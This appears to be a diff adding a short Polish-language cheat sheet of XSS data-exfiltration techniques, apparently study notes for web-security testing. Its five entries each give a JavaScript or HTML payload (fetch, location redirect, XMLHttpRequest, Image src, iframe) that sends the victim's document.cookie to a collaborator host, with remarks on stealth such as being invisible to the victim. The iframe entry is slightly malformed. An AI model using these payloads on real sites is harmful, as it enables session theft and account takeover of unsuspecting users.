@@ -1,0 +1,33 @@
+
+
+  Metody dostarczenia danych w XSS
+
+1. fetch (najlepsza) "wyślij dane stąd tam"
+javascriptfetch('https://collaborator.com', {
+  method: 'POST',
+  body: document.cookie
+})
+✅ Nowoczesna, czysta, nie widoczna dla ofiary
+
+2. location (redirect)
+javascriptdocument.location='https://collaborator.com/?c='+document.cookie
+✅ Prosta, działa wszędzie
+❌ Przekierowuje ofiarę – widzi że coś się dzieje
+
+3. XMLHttpRequest (stary fetch)
+javascriptvar r = new XMLHttpRequest();
+r.open('GET', 'https://collaborator.com/?c='+document.cookie);
+r.send();
+✅ Działa w starszych przeglądarkach
+❌ Bardziej rozbudowany kod
+
+4. Image src trick
+javascriptnew Image().src='https://collaborator.com/?c='+document.cookie
+✅ Bardzo krótki payload
+✅ Działa nawet gdy fetch/XHR zablokowane
+❌ Ograniczona długość URL
+
+5. iframe src "załaduj tamtą stronę tutaj"
+javascriptdocument.location='https://collaborator.com/?c='+document.cookie
+html<iframe src="https://collaborator.com/?c="+document.cookie>
+❌ Nie wysyła cookie automatycznie
